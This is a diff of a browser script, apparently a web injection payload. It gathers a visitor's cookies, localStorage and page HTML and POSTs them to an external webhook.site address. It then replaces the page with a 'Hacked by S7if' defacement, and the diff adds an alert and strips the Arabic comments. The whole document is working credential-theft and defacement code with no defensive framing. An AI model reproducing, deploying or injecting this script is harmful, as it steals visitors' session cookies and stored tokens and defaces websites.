@@ -1,6 +1,7 @@
 <script>
 (async () => {
-  // ⛓ سحب البيانات
+  alert(" Hacked by Saif ");
+
   const everything = {
     cookies: document.cookie,
     localStorage: {...localStorage},
@@ -13,7 +14,6 @@
     html: document.documentElement.outerHTML.slice(0, 2000)
   };
 
-  // 🚀 إرسال البيانات
   try {
     await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
       method: "POST",
@@ -22,9 +22,8 @@
     });
   } catch (e) {}
 
-  // 💀 عرض رسالة الاختراق
   document.body.innerHTML = `
-    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:black;color:#0f0;font-size:2em;font-family:monospace;">
+    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#0f0;font-size:2em;font-family:monospace;">
        Hacked by S7if 
     </div>
   `;
